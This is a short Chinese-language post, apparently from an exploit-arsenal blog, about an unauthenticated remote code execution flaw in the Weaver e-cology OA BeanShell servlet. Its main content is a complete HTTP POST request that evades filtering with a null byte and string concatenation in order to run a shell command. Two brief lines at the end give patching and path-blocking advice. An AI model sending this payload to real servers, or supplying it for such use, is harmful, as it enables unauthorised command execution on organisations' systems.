---
title: '泛微OA Bsh 远程代码执行漏洞'
date: Thu, 17 Sep 2020 07:40:43 +0000
draft: false
tags: ['白阁-武器库']
---

#### 详情

泛微e-cology OA系统的Java Beanshell接口可被未授权访问, 攻击者调用该Beanshell接口, 可构造特定的HTTP请求绕过泛微本身一些安全限制从而达成远程命令执行, 漏洞等级严重

#### 利用方式

```
POST /weaver/bsh.servlet.BshServlet HTTP/1.1
Host: xxxxxxxx:8088
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
Connection: close
Content-Length: 98
Content-Type: application/x-www-form-urlencoded

bsh.script=eval%00("ex"%2b"ec(\"whoami\")");&bsh.servlet.captureOutErr=true&bsh.servlet.output=raw 
```防护方法 1.及时更新泛微补丁 2.拦截/weaver/bsh.servlet.BshServlet目录的访问